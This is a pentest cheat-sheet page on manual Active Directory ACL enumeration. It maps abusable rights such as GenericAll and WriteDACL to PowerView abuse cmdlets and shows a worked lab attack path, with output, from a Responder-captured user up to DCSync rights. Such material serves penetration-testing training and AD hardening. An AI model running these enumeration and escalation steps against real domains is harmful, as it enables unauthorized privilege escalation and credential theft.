# Manual ACL Enumeration

* `ForceChangePassword` abused with `Set-DomainUserPassword`
* `Add Members` abused with `Add-DomainGroupMember`
* `GenericAll` abused with `Set-DomainUserPassword` or `Add-DomainGroupMember`
* `GenericWrite` abused with `Set-DomainObject`
* `WriteOwner` abused with `Set-DomainObjectOwner`
* `WriteDACL` abused with `Add-DomainObjectACL`
* `AllExtendedRights` abused with `Set-DomainUserPassword` or `Add-DomainGroupMember`
* `Addself` abused with `Add-DomainGroupMember`

{% hint style="info" %}
For PowerView enumeration, understand the output : who can do what on who

* who (SecurityIdentifier/IdentifyReferenceName)
* what (ActiveDirectoryRights/ObjectAceType)
* on who (ObjectDN)
{% endhint %}

{% tabs %}
{% tab title="PowerView" %}
```shellscript
# List the outbound object controls our user has over other objects
$sid = Convert-NameToSid <CONTROLLED_USER>
Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid}

# List the inbound object controls for a target user (who has rights over the user)
Get-DomainObjectAcl -Identity <TARGET_USER> -Domain <DOMAIN> -ResolveGUIDs

# Convert the SID to a user / group name
Convert-SidToName <SID>

# Search out objects in the domain with modification rights over non-built-in objects
# IdentityReferenceName is who has the rights 
Find-InterestingDomainAcl -Domain <DOMAIN> -ResolveGUIDs

# Aside from users and computers, we should also look at the ACLs set on file shares
Get-NetShare -ComputerName <COMPUTER>    # List shares on host
Get-PathAcl "\\<COMPUTER>\<SHARE>"       # Get the ACLs on the share

# List objects that can DCSync
$dcsync = Get-ObjectACL "DC=inlanefreight,DC=local" -ResolveGUIDs | ? { ($_.ActiveDirectoryRights -match 'GenericAll') -or ($_.ObjectAceType -match 'Replication-Get')} | Select-Object -ExpandProperty SecurityIdentifier | Select -ExpandProperty value
Convert-SidToName $dcsync
```
{% endtab %}

{% tab title="AD module" %}
```shellscript
# List AD permissions the controlled user has over the target user
# IdentityReference is who has the rights 
(Get-ACL "AD:$((Get-ADUser <TARGET_USER>).distinguishedname)").access | ? {$_.IdentityReference -eq "<DOMAIN>\<CONTROLLED_USER>"}

# Do it for all domain users by creating a user list and retrieving the ACL for each
Get-ADUser -Filter * | Select-Object -ExpandProperty SamAccountName > ad_users.txt
foreach($line in [System.IO.File]::ReadLines("ad_users.txt")) {get-acl  "AD:\$(Get-ADUser $line)" | Select-Object Path -ExpandProperty Access | Where-Object {$_.IdentityReference -match '<DOMAIN>\\<CONTROLLED_USER>'}}
$guid= "<ObjectType_VALUE>"
Get-ADObject -SearchBase "CN=Extended-Rights,$((Get-ADRootDSE).ConfigurationNamingContext)" -Filter {ObjectClass -like 'ControlAccessRight'} -Properties * |Select Name,DisplayName,DistinguishedName,rightsGuid| ?{$_.rightsGuid -eq $guid} | fl

# Find all users having WriteProperty or GenericAll over a target user or group
(Get-ACL "AD:$((Get-ADUser <TARGET_USER>).distinguishedname)").access | ? {$_.ActiveDirectoryRights -match "WriteProperty" -or $_.ActiveDirectoryRights -match "GenericAll"} | Select IdentityReference,ActiveDirectoryRights -Unique | ft -W
(Get-ACL "AD:$((Get-ADGroup <TARGET_USER>).distinguishedname)").access | ? {$_.ActiveDirectoryRights -match "WriteProperty" -or $_.ActiveDirectoryRights -match "GenericAll"} | Select IdentityReference,ActiveDirectoryRights -Unique | ft -W
```
{% endtab %}
{% endtabs %}

### Example of manual enumeration

```shellscript
# Convert user we have control over to SID. We got his hash with responder.
Import-Module .\PowerView.ps1
$sid = Convert-NameToSid wley

# See what rights he has on which object => Force password change over damundsen user
Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid} 

AceQualifier           : AccessAllowed
ObjectDN               : CN=Dana Amundsen,OU=DevOps,OU=IT,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
ActiveDirectoryRights  : ExtendedRight
ObjectAceType          : User-Force-Change-Password
ObjectSID              : S-1-5-21-3842939050-3880317879-2865463114-1176
InheritanceFlags       : ContainerInherit
BinaryLength           : 56
AceType                : AccessAllowedObject
ObjectAceFlags         : ObjectAceTypePresent
IsCallback             : False
PropagationFlags       : None
SecurityIdentifier     : S-1-5-21-3842939050-3880317879-2865463114-1181
AccessMask             : 256
AuditFlags             : None
IsInherited            : False
AceFlags               : ContainerInherit
InheritedObjectAceType : All
OpaqueLength           : 0

# What can control over damundsen user give us ? See what rights he has on which objects
$sid2 = Convert-NameToSid damundsen
Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid2} -Verbose

AceType               : AccessAllowed
ObjectDN              : CN=Help Desk Level 1,OU=Security Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
ActiveDirectoryRights : ListChildren, ReadProperty, GenericWrite
OpaqueLength          : 0
ObjectSID             : S-1-5-21-3842939050-3880317879-2865463114-4022
InheritanceFlags      : ContainerInherit
BinaryLength          : 36
IsInherited           : False
IsCallback            : False
PropagationFlags      : None
SecurityIdentifier    : S-1-5-21-3842939050-3880317879-2865463114-1176
AccessMask            : 131132
AuditFlags            : None
AceFlags              : ContainerInherit
AceQualifier          : AccessAllowed

# damundsen has GenericWrite over Help Desk Level 1 => means we can add any user 
# (or ourself) to this group and inherit its rights 
# Let's look and see if this group is nested into any other groups, remembering that 
# nested group membership will mean that any users in group A will inherit all rights 
# of any group that group A is nested into (a member of)
Get-DomainGroup -Identity "Help Desk Level 1" | select memberof

memberof                                                                      
--------                                                                      
CN=Information Technology,OU=Security Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL

# What can Information tech group give us ? See what rights it has on which objects
$itgroupsid = Convert-NameToSid "Information Technology"
Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $itgroupsid} -Verbose

AceType               : AccessAllowed
ObjectDN              : CN=Angela Dunn,OU=Server Admin,OU=IT,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
ActiveDirectoryRights : GenericAll
OpaqueLength          : 0
ObjectSID             : S-1-5-21-3842939050-3880317879-2865463114-1164
InheritanceFlags      : ContainerInherit
BinaryLength          : 36
IsInherited           : False
IsCallback            : False
PropagationFlags      : None
SecurityIdentifier    : S-1-5-21-3842939050-3880317879-2865463114-4016
AccessMask            : 983551
AuditFlags            : None
AceFlags              : ContainerInherit
AceQualifier          : AccessAllowed

# It has GenericAll over adunn user (Modify group membership, Force change a password
# Perform a targeted Kerberoasting attack and attempt to crack the user's password if it is weak)

# What can control over adunn user give us ? See what rights he has on which objects
$adunnsid = Convert-NameToSid adunn 
Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $adunnsid} -Verbose

AceQualifier           : AccessAllowed
ObjectDN               : DC=INLANEFREIGHT,DC=LOCAL
ActiveDirectoryRights  : ExtendedRight
ObjectAceType          : DS-Replication-Get-Changes-In-Filtered-Set
ObjectSID              : S-1-5-21-3842939050-3880317879-2865463114
InheritanceFlags       : ContainerInherit
BinaryLength           : 56
AceType                : AccessAllowedObject
ObjectAceFlags         : ObjectAceTypePresent
IsCallback             : False
PropagationFlags       : None
SecurityIdentifier     : S-1-5-21-3842939050-3880317879-2865463114-1164
AccessMask             : 256
AuditFlags             : None
IsInherited            : False
AceFlags               : ContainerInherit
InheritedObjectAceType : All
OpaqueLength           : 0

AceQualifier           : AccessAllowed
ObjectDN               : DC=INLANEFREIGHT,DC=LOCAL
ActiveDirectoryRights  : ExtendedRight
ObjectAceType          : DS-Replication-Get-Changes
ObjectSID              : S-1-5-21-3842939050-3880317879-2865463114
InheritanceFlags       : ContainerInherit
BinaryLength           : 56
AceType                : AccessAllowedObject
ObjectAceFlags         : ObjectAceTypePresent
IsCallback             : False
PropagationFlags       : None
SecurityIdentifier     : S-1-5-21-3842939050-3880317879-2865463114-1164
AccessMask             : 256
AuditFlags             : None
IsInherited            : False
AceFlags               : ContainerInherit
InheritedObjectAceType : All
OpaqueLength           : 0

# This means that this user can be leveraged to perform a DCSync attack
```
